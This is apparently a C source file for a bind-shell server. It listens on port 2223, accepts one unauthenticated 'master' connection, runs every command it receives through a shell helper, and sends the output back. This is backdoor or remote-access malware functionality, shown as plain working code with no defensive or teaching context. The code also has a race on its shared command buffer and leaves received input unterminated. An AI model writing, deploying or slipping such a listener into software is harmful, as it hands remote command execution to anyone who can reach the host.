#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <pthread.h>
#include "common.h"
#include "shell.h"

#define PORT 2223
int master_c;

void *command(void*);

int main() {

    pthread_t command_t;
    // SOCKET
    int socket_c = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in sock_addr;
    sock_addr.sin_family = AF_INET;
    sock_addr.sin_port = htons(PORT);
    sock_addr.sin_addr.s_addr = INADDR_ANY;

    // BINDING
    int sock_status = bind(socket_c, (struct sockaddr *) &sock_addr, sizeof(sock_addr));
    if (sock_status < 0) {
	perror("Binding failed");
	close(socket_c);
	return 1;
    } else {
	// LISTEN FOR A SINGLE CONNECTION
	listen(socket_c, 1);
	printf("Listenning on port %d\n", PORT);
    }

    // ACCEPTING CONNECTION
    struct sockaddr_in master_addr;
    long addrlen = sizeof(master_addr);
    master_c = accept(socket_c, (struct sockaddr *) &master_addr, (socklen_t *) &addrlen);

    if (master_c < 0) {
	perror("Connection failed");
	close(socket_c);
	return 1;
    } else {
	char master_ip[INET_ADDRSTRLEN];
	char *pwd = "pwd";
	command((void*) pwd);
	inet_ntop(AF_INET, &master_addr.sin_addr, master_ip, sizeof(master_ip));
	printf("Connected to %s:%d\n", master_ip, ntohs(master_addr.sin_port));
    }
    
    char cmd[1024] = {0};
    do {
	// RECEIVE COMMAND
	ssize_t recvd_bytes  = recv(master_c, cmd, sizeof(cmd), 0);

	if (recvd_bytes <= 0) {
	    perror("Connection error");
	    break;
	}

	if (pthread_create(&command_t, NULL, command, (void*) &cmd) != 0) {
	    perror("Failed to run command");
	}
	
    } while (strncmp(cmd, "exit", 4) != 0);

    // CLOSE CONNECTION
    printf("Clossing connection\n");
    close(master_c);
    close(socket_c);

    return 0;
}

void *command(void *args) {
    char* cmd = (char*)args;

    char *output;
    if (run_c(cmd) == 0) {
	char* pwd = output_p -> pwd;
	char* results = output_p -> output;
	output = malloc(strlen(pwd) + strlen(results) + 5);
	sprintf(output, "%s\n%s", results, pwd);
    } else {
	char *pwd = output_p -> pwd;
	char *error = output_p -> error;
	output = malloc(strlen(pwd) + strlen(error) + 5);
	sprintf(output, "%s\n%s", error, pwd);
    }
    char out[strlen(output) + 1];
    strcpy(out, output);
    send(master_c, out, sizeof(out), 0);

    return NULL;
}
